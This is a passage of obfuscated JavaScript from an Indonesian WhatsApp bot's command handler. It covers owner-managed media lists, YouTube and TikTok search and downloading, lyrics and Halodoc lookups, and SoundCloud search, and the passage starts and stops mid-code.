          fs.unlinkSync(_0x3d8d05);
          _0x3a091f("✅ Gambar berhasil ditambahkan ke database!");
          break;
        }
      case 'delimage':
        {
          if (!_0x2cfe7f) {
            return _0x3a091f("⚠️ Perintah ini hanya untuk pemilik bot.");
          }
          if (!q) {
            return _0x3a091f("❓ Nama gambar yang ingin dihapus belum disebutkan, kak!");
          }
          if (!imagenye.includes(q)) {
            return _0x3a091f("⚠️ Nama ini tidak ada dalam database.");
          }
          let _0x102274 = imagenye.indexOf(q);
          imagenye.splice(_0x102274, 0x1);
          fs.writeFileSync("./media/database/image.json", JSON.stringify(imagenye));
          fs.unlinkSync("./media/" + q + ".jpg");
          _0x3a091f("✅ Gambar berhasil dihapus dari database!");
          break;
        }
      case "listimage":
        {
          let _0x8bc279 = "*🖼️ Daftar Gambar Tersimpan 🖼️*\n\n";
          _0x8bc279 += imagenye.map((_0x1bde3b, _0x47bfc7) => "- " + (_0x47bfc7 + 0x1) + ". " + _0x1bde3b).join("\n");
          _0x8bc279 += "\n\n✨ Total: *" + imagenye.length + "* gambar.";
          _0x3a091f(_0x8bc279);
          break;
        }
      case "addsticker":
        {
          if (!_0x2cfe7f) {
            return _0x3a091f("⚠️ Perintah ini hanya untuk pemilik bot.");
          }
          if (!q) {
            return _0x3a091f("❓ Nama stiker belum disebutkan, kak!");
          }
          if (setiker.includes(q)) {
            return _0x3a091f("⚠️ Nama ini sudah ada dalam database.");
          }
          let _0x1440ad = await _0x59f5fa.downloadAndSaveMediaMessage(_0x5dba36);
          setiker.push(q);
          await fsx.copy(_0x1440ad, "./media/" + q + ".webp");
          fs.writeFileSync("./media/database/sticker.json", JSON.stringify(setiker));
          fs.unlinkSync(_0x1440ad);
          _0x3a091f("✅ Stiker berhasil ditambahkan ke database!");
          break;
        }
      case "delsticker":
        {
          if (!_0x2cfe7f) {
            return _0x3a091f("⚠️ Perintah ini hanya untuk pemilik bot.");
          }
          if (!q) {
            return _0x3a091f("❓ Nama stiker yang ingin dihapus belum disebutkan, kak!");
          }
          if (!setiker.includes(q)) {
            return _0x3a091f("⚠️ Nama ini tidak ada dalam database.");
          }
          let _0x47caf2 = setiker.indexOf(q);
          setiker.splice(_0x47caf2, 0x1);
          fs.writeFileSync("./media/database/sticker.json", JSON.stringify(setiker));
          fs.unlinkSync('./media/' + q + ".webp");
          _0x3a091f("✅ Stiker berhasil dihapus dari database!");
          break;
        }
      case "liststicker":
        {
          let _0x26e1ca = "*🌟 Daftar Stiker Tersimpan 🌟*\n\n";
          _0x26e1ca += setiker.map((_0x2778ff, _0xc08c33) => "- " + (_0xc08c33 + 0x1) + ". " + _0x2778ff).join("\n");
          _0x26e1ca += "\n\n✨ Total: *" + setiker.length + "* stiker.";
          _0x3a091f(_0x26e1ca);
          break;
        }
      case 'addvn':
        {
          if (!_0x2cfe7f) {
            return _0x3a091f("⚠️ Perintah ini hanya untuk pemilik bot.");
          }
          if (!q) {
            return _0x3a091f("❓ Nama audio belum disebutkan, kak!");
          }
          if (audionye.includes(q)) {
            return _0x3a091f("⚠️ Nama ini sudah ada dalam database.");
          }
          let _0x3e5906 = await _0x59f5fa.downloadAndSaveMediaMessage(_0x5dba36);
          audionye.push(q);
          await fsx.copy(_0x3e5906, './media/' + q + '.mp3');
          fs.writeFileSync("./media/database/audio.json", JSON.stringify(audionye));
          fs.unlinkSync(_0x3e5906);
          _0x3a091f("✅ Audio berhasil ditambahkan ke database!");
          break;
        }
      case 'delvn':
        {
          if (!_0x2cfe7f) {
            return _0x3a091f("⚠️ Perintah ini hanya untuk pemilik bot.");
          }
          if (!q) {
            return _0x3a091f("❓ Nama audio yang ingin dihapus belum disebutkan, kak!");
          }
          if (!audionye.includes(q)) {
            return _0x3a091f("⚠️ Nama ini tidak ada dalam database.");
          }
          let _0x24e2c0 = audionye.indexOf(q);
          audionye.splice(_0x24e2c0, 0x1);
          fs.writeFileSync('./media/database/audio.json', JSON.stringify(audionye));
          fs.unlinkSync("./media/" + q + ".mp3");
          _0x3a091f("✅ Audio berhasil dihapus dari database!");
          break;
        }
      case "listvn":
        {
          let _0x3265ae = "*🎶 Daftar Audio Tersimpan 🎶*\n\n";
          _0x3265ae += audionye.map((_0x4772b5, _0x54508b) => "- " + (_0x54508b + 0x1) + ". " + _0x4772b5).join("\n");
          _0x3265ae += "\n\n✨ Total: *" + audionye.length + "* audio.";
          _0x3a091f(_0x3265ae);
          break;
        }
      case 'q':
      case "quoted":
        {
          if (!_0x5dba36) {
            return _0x3a091f("Mohon reply pesan yang ingin di quoted ya kak! 🙏");
          }
          let _0x2cdf1b = await _0x59f5fa.serializeM(await _0x3f87c6.getQuotedObj());
          if (!_0x2cdf1b.quoted) {
            return _0x3a091f(mess.error);
          }
          try {
            await _0x2cdf1b.quoted.copyNForward(_0x3f87c6.chat, true);
          } catch (_0x2e933c) {
            console.log(_0x2e933c);
            _0x3a091f(mess.error);
          }
        }
        ;
        break;
      case "yts":
      case 'ytsearch':
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          if (!_0x2b2627) {
            return _0x3a091f("🔍 *Judul atau kata kunci videonya mana, Kak?*\n\nContoh:\n" + (_0x4773c6 + _0x4ac520) + " story wa anime");
          }
          try {
            await _0x3f87c6.react('⏳');
            let _0x44e9d3 = await yts(_0x2b2627);
            if (!_0x44e9d3 || !_0x44e9d3.videos || _0x44e9d3.videos.length === 0x0) {
              return _0x3a091f("❌ *Video tidak ditemukan!* Coba kata kunci lain ya, Kak.");
            }
            let _0x42c596 = _0x44e9d3.videos.slice(0x0, 0x5);
            for (let _0x4c52d8 = 0x0; _0x4c52d8 < _0x42c596.length; _0x4c52d8++) {
              let _0xe380c3 = _0x42c596[_0x4c52d8];
              let _0x100c6f = "🔢 *No*: " + (_0x4c52d8 + 0x1) + "\n";
              _0x100c6f += "🎬 *Judul*: " + (_0xe380c3.title || "Tidak ada judul") + "\n";
              _0x100c6f += "👤 *Channel*: " + (_0xe380c3.author?.["name"] || "Tidak diketahui") + "\n";
              _0x100c6f += "👁️ *Views*: " + (_0xe380c3.views || "Tidak diketahui") + "\n";
              _0x100c6f += "⏳ *Durasi*: " + (_0xe380c3.timestamp || "Tidak diketahui") + "\n";
              _0x100c6f += "📆 *Diunggah*: " + (_0xe380c3.ago || "Tidak diketahui") + "\n";
              _0x100c6f += "🔗 *Link*: " + (_0xe380c3.url || "Tidak ada link") + "\n";
              await _0x59f5fa.sendMessage(_0x3f87c6.chat, {
                'image': {
                  'url': _0xe380c3.thumbnail || imageUrl
                },
                'caption': _0x100c6f
              }, {
                'quoted': _0x3f87c6
              });
            }
            _0x3a091f("✅ *Berhasil menampilkan 5 hasil pencarian dari YouTube!*");
          } catch (_0x13db13) {
            console.error(_0x13db13);
            _0x3a091f("❌ *Terjadi kesalahan saat mencari video!* 😭\n" + (_0x13db13.message || _0x13db13));
          }
        }
        db.data.users[_0x3f87c6.sender].limit -= 0x1;
        break;
      case "hdoc":
      case "halodoc":
      case "cari":
        {
          if (!_0x2b2627) {
            return _0x3a091f("Ketikkan perintah dengan format:\n*!cari [penyakit]*\n\n*Kirim perintah*: *!cari diabetes*");
          }
          const _0x31b3f6 = _0x2b2627.trim();
          const _0x94f0 = await halodoc(_0x31b3f6);
          try {
            _0x3a091f("🔍 Sedang mencari informasi, mohon tunggu...");
            const _0x200402 = await _0x94f0.getArtikelSearch();
            const _0x2ae5fe = await _0x94f0.getObatSearch();
            if (_0x200402.length === 0x0 && _0x2ae5fe.length === 0x0) {
              return _0x3a091f("❌ Tidak ditemukan informasi terkait penyakit yang dicari.");
            }
            let _0x16b1c5 = "*📚 Artikel Tentang Penyakit:*\n";
            for (let _0x13aa51 = 0x0; _0x13aa51 < Math.min(_0x200402.length, 0x5); _0x13aa51++) {
              const {
                title: _0x1e7d74,
                description: _0x5eaed5,
                link: _0x1133f2
              } = _0x200402[_0x13aa51];
              _0x16b1c5 += "\n*" + (_0x13aa51 + 0x1) + ". " + _0x1e7d74 + "*\n" + _0x5eaed5 + "\n";
            }
            let _0x3deadc = "\n*💊 Obat yang Direkomendasikan:*\n";
            for (let _0x44be19 = 0x0; _0x44be19 < Math.min(_0x2ae5fe.length, 0x5); _0x44be19++) {
              const {
                title: _0x542dd2,
                subtitle: _0x31e770,
                price: _0x431451,
                link: _0x313e0c
              } = _0x2ae5fe[_0x44be19];
              _0x3deadc += "\n*" + (_0x44be19 + 0x1) + ". " + _0x542dd2 + "*\n" + _0x31e770 + "\n💰 Harga: " + _0x431451 + "\n";
            }
            await _0x3a091f(_0x16b1c5 + _0x3deadc);
          } catch (_0x481eb3) {
            console.error(_0x481eb3);
            _0x3a091f("❌ Terjadi kesalahan saat mencari informasi. Coba lagi nanti.");
          }
        }
        db.data.users[_0x3f87c6.sender].limit -= 0x1;
        break;
      case "lirik":
      case "lyrics":
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          if (!_0x2b2627) {
            return _0x3a091f("⚠️ Kak, jangan lupa tulis judul lagunya! 🥺\n*Kirim perintah*: *" + (_0x4773c6 + _0x4ac520) + " Someone Like You*");
          }
          try {
            const _0x467891 = await lyrics.search(_0x2b2627);
            if (_0x467891.length === 0x0) {
              return _0x3a091f("⚠️ Tidak ada hasil yang ditemukan untuk lagu tersebut. Coba judul lain, ya! 🎶");
            }
            const _0x83d779 = _0x467891[0x0];
            let _0x39de89 = "🎵 *Lirik Lagu Ditemukan!* 🎵\n\n";
            _0x39de89 += "📌 *Judul*: " + _0x83d779.title + "\n";
            _0x39de89 += "🎤 *Artis*: " + _0x83d779.artist + "\n";
            _0x39de89 += "💿 *Album*: " + _0x83d779.album + "\n";
            _0x39de89 += "🔗 *Lirik Lengkap*: " + _0x83d779.link + "\n";
            _0x39de89 += "🖼️ *Gambar*: " + (_0x83d779.imageUrl || "Tidak ada gambar") + "\n\n";
            _0x39de89 += "_Sedang mengambil lirik lengkap, tunggu sebentar..._";
            await await _0x3a091f(_0x39de89);
            const _0x1575f1 = await lyrics.getLyrics(_0x83d779.link);
            let _0x1e4474 = "🎼 *Lirik Lengkap: " + _0x83d779.title + "* 🎼\n\n";
            _0x1e4474 += (_0x1575f1.lyrics || "Lirik tidak tersedia.") + "\n\n";
            _0x1e4474 += "📅 *Tahun Rilis*: " + (_0x1575f1.year || "Tidak diketahui") + "\n";
            _0x1e4474 += "🎧 *Playlist*: " + (_0x1575f1.playlists || "Tidak ada playlist") + "\n";
            _0x1e4474 += "🖼️ *Artis*: " + (_0x1575f1.artistImage || "Tidak ada gambar artis") + "\n";
            _0x3a091f(_0x1e4474);
          } catch (_0x566279) {
            console.error(_0x566279);
            _0x3a091f("⚠️ Terjadi kesalahan saat mencari lirik lagu. Coba lagi nanti ya, Kak!");
          }
        }
        db.data.users[_0x3f87c6.sender].limit -= 0x1;
        break;
      case 'yt':
      case 'play':
      case 'ytplay':
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          if (!_0x2b2627) {
            return _0x3a091f("*Kirim perintah*: " + (_0x4773c6 + _0x4ac520) + " Lagu favorit");
          }
          try {
            await _0x3f87c6.react('⏱️');
            const _0x547af2 = await yts('' + _0x2b2627);
            if (!_0x547af2 || _0x547af2.all.length === 0x0) {
              return _0x3a091f("*Lagu tidak ditemukan!* ☹️");
            }
            const {
              videoId: _0x153742,
              image: _0x170db5,
              title: _0x24c87d,
              views: _0x536806,
              duration: _0x14e4d7,
              author: _0x45cc70,
              ago: _0x185e14,
              url: _0x14360f,
              description: _0x5e07ba
            } = _0x547af2.all[0x0];
            const _0x411cff = [{
              'name': "single_select",
              'buttonParamsJson': "{\n\t\t\t\t\t\t\t\"title\": \"Click Here ⎙\",\n\t\t\t\t\t\t\t\"sections\": [\n\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\"title\": \"Unduh Audio 🎧\",\n\t\t\t\t\t\t\t\t\t\"rows\": [\n\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t\"header\": \"Audio Otomatis 🎵\",\n\t\t\t\t\t\t\t\t\t\t\t\"title\": \"Download Audio - Automatic Quality\",\n\t\t\t\t\t\t\t\t\t\t\t\"id\": \".ytmp3 " + _0x14360f + "\"\n\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t]\n\t\t\t\t\t\t\t\t},\n\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\"title\": \"Unduh Video 🎥\",\n\t\t\t\t\t\t\t\t\t\"rows\": [\n\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t\"header\": \"Video Otomatis 🎥\",\n\t\t\t\t\t\t\t\t\t\t\t\"title\": \"Download Video - Automatic Quality\",\n\t\t\t\t\t\t\t\t\t\t\t\"id\": \".ytmp4 " + _0x14360f + "\"\n\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t]\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t]\n\t\t\t\t\t\t}"
            }];
            let _0x2a44b1 = '*' + _0x24c87d + "*\n\n";
            _0x2a44b1 += "*🎶 Jenis*: Play\n";
            _0x2a44b1 += "*📌 ID*: " + _0x153742 + "\n";
            _0x2a44b1 += "*⏱️ Durasi*: " + _0x14e4d7 + "\n";
            _0x2a44b1 += "*🕒 Diunggah*: " + _0x185e14 + "\n";
            _0x2a44b1 += "*🔗 Link*: " + _0x14360f + "\n\n";
            _0x2a44b1 += "_*Pilih jenis download yang Kamu butuhin... pilih yang paling pas buat Kamu ya!*_";
            _0x59f5fa.sendButtonImage(_0x3f87c6.chat, {
              'url': _0x170db5
            }, _0x411cff, _0x2a44b1, footer, _0x3f87c6);
          } catch (_0x573d0c) {
            console.log(_0x573d0c);
            _0x3a091f("Gagal saat melakukan tindakan, jika anda pemilik silahkan cek console.");
          }
          ;
          db.data.users[_0x3f87c6.sender].limit -= 0x1;
          break;
        }
      case "ytaudio":
      case "ytmp3":
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          if (!_0x2b2627) {
            return _0x3a091f("*Kirim perintah*: " + (_0x4773c6 + _0x4ac520) + " <url>");
          }
          const _0x568552 = /^(https?:\/\/)?(www\.)?(youtube\.com\/(watch\?v=|embed\/|v\/|shorts\/)|youtu\.be\/)([a-zA-Z0-9_-]{11})(\S*)?$/;
          if (!_0x568552.test(_0x2b2627)) {
            return _0x3a091f("Link yang Kamu masukkan bukan link YouTube valid! 😅");
          }
          try {
            const _0x14ab91 = await youtube(_0x2b2627);
            if (_0x14ab91 && _0x14ab91.mp3) {
              let _0x5d45b7 = '*' + _0x14ab91.title + "*\n\n";
              _0x5d45b7 += "- *Creator*: " + (_0x14ab91.name || "Tidak diketahui") + "\n";
              _0x5d45b7 += "- *Views*: " + _0x470f24(_0x14ab91.views || '0') + "\n";
              _0x5d45b7 += "- *Upload*: " + (_0x14ab91.ago || "Tidak diketahui") + "\n";
              _0x5d45b7 += "- *Status*: Done! ✅\n\n";
              _0x5d45b7 += "_Tunggu sebentar, media sedang dikirim..._";
              await _0x3a091f(_0x5d45b7);
              await _0x59f5fa.sendMessage(_0x3f87c6.chat, {
                'audio': {
                  'url': _0x14ab91.mp3
                },
                'mimetype': "audio/mp4"
              }, {
                'quoted': _0x3f87c6
              });
            } else {
              _0x3a091f("Gagal mengambil data dari YouTube.");
            }
          } catch (_0x6ee0fb) {
            console.error(_0x6ee0fb);
            await _0x3f87c6.react('😭');
            _0x3a091f("*Data tidak ditemukan!* ☹️");
          }
          db.data.users[_0x3f87c6.sender].limit -= 0x1;
          break;
        }
      case "ytmp4":
      case 'ytvideo':
      case 'ytv':
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          if (!_0x2b2627) {
            return _0x3a091f("*Kirim perintah*: " + (_0x4773c6 + _0x4ac520) + " <url>");
          }
          const _0x12b486 = /^(https?:\/\/)?(www\.)?(youtube\.com\/(watch\?v=|embed\/|v\/|shorts\/)|youtu\.be\/)([a-zA-Z0-9_-]{11})(\S*)?$/;
          if (!_0x12b486.test(_0x2b2627)) {
            return _0x3a091f("Link yang Kamu masukkan bukan link YouTube valid! 😅");
          }
          try {
            const _0x24ed5a = await youtube(_0x2b2627);
            if (_0x24ed5a && _0x24ed5a.mp4) {
              let _0x1057c1 = '*' + _0x24ed5a.title + "*\n\n";
              _0x1057c1 += "- *Creator*: " + (_0x24ed5a.name || "Tidak diketahui") + "\n";
              _0x1057c1 += "- *Views*: " + _0x470f24(_0x24ed5a.views || '0') + "\n";
              _0x1057c1 += "- *Upload*: " + (_0x24ed5a.ago || "Tidak diketahui") + "\n";
              _0x1057c1 += "- *Status*: Done! ✅";
              _0x59f5fa.sendMessage(_0x3f87c6.chat, {
                'video': {
                  'url': _0x24ed5a.mp4
                },
                'caption': _0x1057c1
              }, {
                'quoted': _0x3f87c6
              });
            } else {
              _0x3a091f("Gagal mengambil data dari YouTube.");
            }
          } catch (_0x4f6410) {
            console.error(_0x4f6410);
            await _0x3f87c6.react('😭');
            _0x3a091f("*Data tidak ditemukan!* ☹️");
          }
          db.data.users[_0x3f87c6.sender].limit -= 0x1;
          break;
        }
      case 'tiktokslide':
      case "ttslide":
      case "tiktokfoto":
      case 'tiktokmp4':
      case 'tt':
      case 'ttnowm':
      case "tiktoknowm":
      case "tiktok":
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          if (!_0x2b2627) {
            return _0x3a091f("⚠️ Hmm... Kamu belum kasih link nih! 🫣 Coba ketik kayak gini ya: *" + (_0x4773c6 + _0x4ac520) + " <url>*");
          }
          try {
            await _0x3f87c6.react('⏱️');
            let _0x3bf480 = await tiktokDownloaderVideo(_0x2b2627);
            let _0x4d226e = 0x0;
            for (let _0x2ca2b6 of _0x3bf480.data) {
              if (_0x2ca2b6.type == "nowatermark") {
                await _0x59f5fa.sendMessage(_0x3f87c6.chat, {
                  'video': {
                    'url': _0x2ca2b6.url
                  },
                  'caption': "🎥 *Video Info*:\n📍 Region: " + _0x3bf480.region + "\n⏳ Duration: " + _0x3bf480.duration + "\n📅 Taken: " + _0x3bf480.taken_at + "\n\n📊 *Statistik Info*:\n👁️ Views: " + _0x3bf480.stats.views + "\n❤️ Likes: " + _0x3bf480.stats.likes + "\n💬 Comment: " + _0x3bf480.stats.comment + "\n🔄 Share: " + _0x3bf480.stats.share + "\n📥 Download: " + _0x3bf480.stats.download + "\n\n👤 *Author Info*:\n📝 Fullname: " + _0x3bf480.author.fullname + "\n🏷️ Nickname: " + _0x3bf480.author.nickname + "\n\n🎵 *Music Info*:\n🎼 Title: " + _0x3bf480.music_info.title + "\n🎤 Author: " + _0x3bf480.music_info.author + "\n💿 Album: " + _0x3bf480.music_info.album + "\n\n📝 *Caption*:\n" + (_0x3bf480.title || "No Caption")
                }, {
                  'quoted': _0x3f87c6
                });
              }
              if (_0x2ca2b6.type == "photo") {
                if (_0x4d226e == 0x0) {
                  await _0x59f5fa.sendMessage(_0x3f87c6.chat, {
                    'image': {
                      'url': _0x2ca2b6.url
                    },
                    'caption': "🖼️ *Photo Info*:\n📍 Region: " + _0x3bf480.region + "\n📅 Taken: " + _0x3bf480.taken_at + "\n\n📊 *Statistik Info*:\n👁️ Views: " + _0x3bf480.stats.views + "\n❤️ Likes: " + _0x3bf480.stats.likes + "\n💬 Comment: " + _0x3bf480.stats.comment + "\n🔄 Share: " + _0x3bf480.stats.share + "\n📥 Download: " + _0x3bf480.stats.download + "\n\n👤 *Author Info*:\n📝 Fullname: " + _0x3bf480.author.fullname + "\n🏷️ Nickname: " + _0x3bf480.author.nickname + "\n\n🎵 *Music Info*:\n🎼 Title: " + _0x3bf480.music_info.title + "\n🎤 Author: " + _0x3bf480.music_info.author + "\n💿 Album: " + _0x3bf480.music_info.album + "\n\n📝 *Caption*:\n" + (_0x3bf480.title || "No Caption") + (_0x3f87c6.isGroup ? _0x3bf480.data.length > 0x1 ? "\n📥 _Sisa foto dikirim ke private chat_\n" : "\n" : "\n")
                  }, {
                    'quoted': _0x3f87c6
                  });
                } else {
                  await _0x59f5fa.sendMessage(_0x3f87c6.sender, {
                    'image': {
                      'url': _0x2ca2b6.url
                    }
                  }, {
                    'quoted': _0x3f87c6
                  });
                }
                _0x4d226e += 0x1;
                await sleep(0x7d0);
              }
            }
          } catch (_0x29514f) {
            console.log(_0x29514f);
            _0x3a091f("⚠️ Gagal mengambil data dari TikTok. Pastikan URL valid atau coba lagi nanti.");
          }
        }
        db.data.users[_0x3f87c6.sender].limit -= 0x1;
        break;
      case 'ttaudio':
      case 'tiktokmp3':
      case 'ttmp3':
      case "tiktokaudio":
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          if (!_0x2b2627) {
            return _0x3a091f("⚠️ Hmm... Kamu belum kasih link nih! 🫣 Coba ketik kayak gini ya: *" + (_0x4773c6 + _0x4ac520) + " <url>*");
          }
          try {
            await _0x3f87c6.react('⏱️');
            let _0x28a9eb = await tiktokDownloaderVideo(_0x2b2627);
            let _0x242268 = _0x28a9eb.music_info.url;
            await _0x59f5fa.sendMessage(_0x3f87c6.chat, {
              'text': "🎵 *TikTok Audio*\n\n" + ("🎼 *Judul*: " + (_0x28a9eb.music_info.title || '-') + "\n") + ("🎤 *Author*: " + (_0x28a9eb.music_info.author || '-') + "\n") + ("💿 *Album*: " + (_0x28a9eb.music_info.album || '-') + "\n\n") + ("🔗 *Source*: " + _0x2b2627)
            }, {
              'quoted': _0x3f87c6
            });
            await _0x59f5fa.sendMessage(_0x3f87c6.chat, {
              'audio': {
                'url': _0x242268
              },
              'mimetype': "audio/mp4",
              'fileName': (_0x28a9eb.music_info.title || "audio") + ".mp3"
            }, {
              'quoted': _0x3f87c6
            });
          } catch (_0x552484) {
            console.error(_0x552484);
            await _0x3a091f("❌ Terjadi kesalahan saat mengambil audio. Coba lagi nanti, ya Kak!");
          }
        }
        db.data.users[_0x3f87c6.sender].limit -= 0x1;
        break;
      case "tiktoksearch":
      case "tiktoks":
      case "ttsearch":
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f("Yah kak, limitnya udah habis nih 😢. Yuk upgrade ke premium biar bisa terus pakai fitur ini! ✨");
          }
          if (!_0x2b2627) {
            return _0x3a091f("⚠️ Eits, Kamu lupa kasih kata kunci! 😅\nCoba ketik kayak gini ya: *" + (_0x4773c6 + _0x4ac520) + " <query>*");
          }
          try {
            await _0x3f87c6.react('⏱️');
            let _0x952850 = await tiktokSearchVideo(_0x2b2627);
            let _0x58f98b = "🎥 *" + _0x952850.videos[0x0].title + "*\n\n";
            _0x58f98b += "🆔 *Video ID*: " + _0x952850.videos[0x0].video_id + "\n";
            _0x58f98b += "👤 *Username*: " + _0x952850.videos[0x0].author.unique_id + "\n";
            _0x58f98b += "🏷️ *Nickname*: " + _0x952850.videos[0x0].author.nickname + "\n";
            _0x58f98b += "⏳ *Duration*: " + _0x952850.videos[0x0].duration + " detik\n";
            _0x58f98b += "❤️ *VT Like*: " + _0x952850.videos[0x0].digg_count + "\n";
            _0x58f98b += "💬 *Comment*: " + _0x952850.videos[0x0].comment_count + "\n";
            _0x58f98b += "🔄 *Share*: " + _0x952850.videos[0x0].share_count + "\n\n";
            _0x58f98b += "🔗 *Link*: https://www.tiktok.com/@" + _0x952850.videos[0x0].author.unique_id + "/video/" + _0x952850.videos[0x0].video_id;
            let _0x54d908 = '';
            let _0x2b00a6 = 0x1;
            for (let _0x2dea88 of _0x952850.videos) {
              _0x54d908 += "\n" + _0x2b00a6++ + ". 🎵 *" + _0x2dea88.title + "*\n";
              _0x54d908 += "⏳ *Duration*: " + _0x2dea88.duration + " detik\n";
              _0x54d908 += "❤️ *Likes*: " + _0x2dea88.digg_count + "\n";
              _0x54d908 += "💬 *Comments*: " + _0x2dea88.comment_count + "\n";
              _0x54d908 += "🔄 *Shares*: " + _0x2dea88.share_count + "\n";
              _0x54d908 += "🔗 *Link*: https://www.tiktok.com/@" + _0x2dea88.author.unique_id + "/video/" + _0x2dea88.video_id + "\n";
            }
            await _0x59f5fa.sendMessage(_0x3f87c6.chat, {
              'video': {
                'url': "https://tikwm.com" + _0x952850.videos[0x0].play
              },
              'caption': _0x58f98b
            }, {
              'quoted': _0x3f87c6
            });
            if (_0x952850.videos.length > 0x1) {
              await _0x59f5fa.sendMessage(_0x3f87c6.chat, {
                'text': "📚 *Daftar Video Lainnya:*\n" + _0x54d908
              }, {
                'quoted': _0x3f87c6
              });
            }
          } catch (_0x173d60) {
            console.log(_0x173d60);
            _0x3a091f("Aduh, ada error kak 😟. Coba lagi ya, KoKoRey siap bantu! ✨");
          }
        }
        db.data.users[_0x3f87c6.sender].limit -= 0x1;
        break;
      case "scroll":
      case "carivideo":
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f("Yah kak, limitnya udah habis nih 😢. Yuk upgrade ke premium biar makin bebas pakai fitur ini! ✨");
          }
          if (!_0x256404) {
            return _0x3a091f("Fitur ini khusus buat pengguna premium aja, kak! Yuk upgrade sekarang juga biar bisa pakai fitur ini 😊.");
          }
          if (!_0x2b2627) {
            return _0x3a091f("⚠️ Eits, Kamu lupa kasih kata kunci nih! 😅\nCoba ketik kayak gini ya: *" + (_0x4773c6 + _0x4ac520) + " galau* 😉");
          }
          let _0x27795e = await tiktokSearchVideo(_0x2b2627);
          let _0x154cf2 = "🎥 " + _0x27795e.videos[0x0].title + "\n\n";
          _0x154cf2 += "🆔 *Video ID*: " + _0x27795e.videos[0x0].video_id + "\n";
          _0x154cf2 += "👤 *Username*: " + _0x27795e.videos[0x0].author.unique_id + "\n";
          _0x154cf2 += "🏷️ *Nickname*: " + _0x27795e.videos[0x0].author.nickname + "\n";
          _0x154cf2 += "⏳ *Duration*: " + _0x27795e.videos[0x0].duration + " detik\n";
          _0x154cf2 += "❤️ *VT Like*: " + _0x27795e.videos[0x0].digg_count + "\n";
          _0x154cf2 += "💬 *Comment*: " + _0x27795e.videos[0x0].comment_count + "\n";
          _0x154cf2 += "🔄 *Share*: " + _0x27795e.videos[0x0].share_count + "\n\n";
          _0x154cf2 += "🔗 *Link*: https://www.tiktok.com/@" + _0x27795e.videos[0x0].author.unique_id + "/video/" + _0x27795e.videos[0x0].video_id;
          _0x3f87c6.reply({
            'video': {
              'url': "https://tikwm.com" + _0x27795e.videos[0x0].play
            },
            'caption': _0x154cf2,
            'footer': footer,
            'buttons': [{
              'buttonId': _0x4773c6 + _0x4ac520 + " " + _0x2b2627,
              'buttonText': {
                'displayText': "Cari Lagi 🔍"
              }
            }, {
              'buttonId': ".ttmp3 https://www.tiktok.com/@" + _0x27795e.videos[0x0].author.unique_id + '/video/' + _0x27795e.videos[0x0].video_id,
              'buttonText': {
                'displayText': "Unduh MP3 🎵"
              }
            }],
            'viewOnce': true
          });
        }
        ;
        break;
      case "presetam":
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          if (!_0x2b2627) {
            return _0x3a091f("⚠️ Eits, Kamu lupa kasih URL! 😗 Coba ketik kayak gini ya: *" + (_0x4773c6 + _0x4ac520) + " [URL Alight Motion]*");
          }
          if (!(_0x2b2627.includes("http://") || _0x2b2627.includes("https://"))) {
            return _0x3a091f("⚠️ URL tidak valid. Coba pakai URL yang diawali dengan http:// atau https://");
          }
          if (!(_0x2b2627.includes('alight.link') || _0x2b2627.includes("alightcreative.com"))) {
            return _0x3a091f("⚠️ URL yang diberikan bukan URL Alight Motion!");
          }
          try {
            await _0x3f87c6.react('⏱️');
            const _0x2660ba = await alightScrape(_0x2b2627);
            if (_0x2660ba.error) {
              return _0x3a091f(_0x2660ba.error);
            }
            const {
              title: _0x32a51e,
              description: _0x1b20c5
            } = _0x2660ba;
            await _0x3a091f("「 *PRESET ALIGHT MOTION* 」\n\n · *Judul*: " + _0x32a51e + "\n · *Deskripsi*: " + _0x1b20c5);
          } catch (_0x12c7d8) {
            console.error(_0x12c7d8);
            _0x3a091f("⚠️ Terjadi kesalahan saat mengambil data dari URL!");
          }
        }
        db.data.users[_0x3f87c6.sender].limit -= 0x1;
        break;
      case 'soundcloudsearch':
      case 'scsearch':
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          if (!_0x2b2627) {
            return _0x3a091f("⚠️ Eits, Kamu lupa kasih kata kunci! 😗 Coba ketik kayak gini ya: *" + (_0x4773c6 + _0x4ac520) + " <query>*");
          }
          try {
            let _0x39f1d8 = await scrapeSoundCloud(_0x2b2627);
            if (_0x39f1d8.length === 0x0) {
              return _0x3a091f("😔 Maaf, kak! Tidak ada hasil yang ditemukan. Coba kata kunci yang lain ya!");
            }
            let _0x91bc5 = "🎧 *Hasil Pencarian SoundCloud untuk*: " + _0x2b2627 + "\n\n";
            let _0x354469 = '';
            let _0x5db5e4 = 0x1;
            for (let _0x402926 of _0x39f1d8) {
              _0x354469 += "\n" + _0x5db5e4++ + ". 🎵 *" + _0x402926.title + "*\n" + ("🔗 *Link*: " + _0x402926.url + "\n");
            }
            await _0x59f5fa.sendMessage(_0x3f87c6.chat, {
              'text': _0x91bc5 + _0x354469
            }, {
              'quoted': _0x3f87c6
            });
          } catch (_0x4496a9) {
